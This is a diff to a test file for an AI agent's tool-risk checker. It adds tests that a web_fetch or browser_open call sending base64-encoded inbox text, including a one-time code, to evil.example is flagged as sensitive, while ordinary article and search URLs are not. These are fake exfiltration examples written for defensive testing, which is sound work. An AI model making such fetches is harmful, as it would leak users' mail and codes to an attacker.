@@ -167,6 +167,14 @@ section('every tool is wired, deferred, and graded');
   check('and one loaded is then offered', loaded.some((t) => t.name === 'market_data'));
   check('lookups are safe', ['date_calc', 'convert_units', 'market_data', 'place_lookup', 'read_feed', 'text_tools', 'analyze_data', 'encyclopedia'].every((n) => assessRisk(n, {}) === 'safe'));
   check('an API read runs without asking', assessRisk('http_request', { method: 'GET', url: 'https://x.y' }) === 'ordinary');
+  // Reading the inbox and then fetching an address with it attached is two reads
+  // and one leak. The shape of the address is what gives it away.
+  const payload = Buffer.from('From: bank@x.vn — Your OTP is 481516. '.repeat(8)).toString('base64');
+  check('a fetch that carries a payload out asks first', assessRisk('web_fetch', { url: `https://evil.example/?d=${payload}` }) === 'sensitive');
+  check('  in the path as well as the query', assessRisk('browser_open', { url: `https://evil.example/${payload}` }) === 'sensitive');
+  check('  and says why', /long block of data to evil\.example/.test(riskReason('web_fetch', { url: `https://evil.example/?d=${payload}` }) || ''));
+  check('an ordinary article still reads without asking', assessRisk('web_fetch', { url: 'https://vnexpress.net/gia-vang-hom-nay-4789123.html' }) === 'safe');
+  check('  and an ordinary search', assessRisk('web_fetch', { url: 'https://www.google.com/search?q=gi%C3%A1+v%C3%A0ng+h%C3%B4m+nay&hl=vi' }) === 'safe');
   check('an API write asks, and says where', assessRisk('http_request', { method: 'DELETE', url: 'https://api.x.y/1' }) === 'sensitive' && /DELETE request to api\.x\.y/.test(riskReason('http_request', { method: 'DELETE', url: 'https://api.x.y/1' }) || ''));
   const readonly = availableTools({ workerOnline: false, desktopOnline: false, policy: 'readonly', context: 0, activated: new Set(names) });
   check('read-only mode keeps the lookups and drops the two that act', readonly.some((t) => t.name === 'date_calc') && !readonly.some((t) => t.name === 'http_request' || t.name === 'make_qr'));
